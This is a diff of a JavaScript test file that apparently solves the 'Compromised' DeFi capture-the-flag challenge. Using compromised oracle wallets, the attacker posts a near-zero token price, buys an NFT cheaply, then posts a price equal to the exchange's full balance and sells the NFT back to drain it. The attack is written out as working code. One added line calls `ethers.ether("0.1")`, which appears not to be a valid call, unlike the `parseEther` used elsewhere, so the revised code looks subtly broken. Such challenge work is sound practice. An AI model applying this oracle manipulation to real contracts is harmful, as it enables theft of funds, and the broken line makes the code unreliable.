@@ -78,13 +78,14 @@ describe('Compromised challenge', function () {
         console.log(startPrice.toString())
 
         for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,0);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,1);
         }
     
         console.log("price manipulated")
         const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(afterPrice.toString())
-		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: ethers.utils.parseEther('2') });
+        const reducedPrice = await ethers.ether("0.1")
+		const boughtNft = await this.exchange.connect(attacker).buyOne( { value: reducedPrice });
         const tx = await boughtNft.wait()
         const tokenId = tx.events.find(item=>item.event=='TokenBought').args.tokenId.toString()
         console.log("Bought tokenId",tokenId)
@@ -93,12 +94,16 @@ describe('Compromised challenge', function () {
         console.log("Balance",exchangeBalance.toString())
         console.log(startPrice)
 		for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  EXCHANGE_INITIAL_ETH_BALANCE);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol,  exchangeBalance.toString());
         }
         const dumpPrice = await this.oracle.getMedianPrice(tokenSymbol)
 		console.log("dump price",dumpPrice.toString())
 		await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId);
 		await this.exchange.connect(attacker).sellOne(tokenId);
+        //
+        //
+        //
+        
  
     });
 
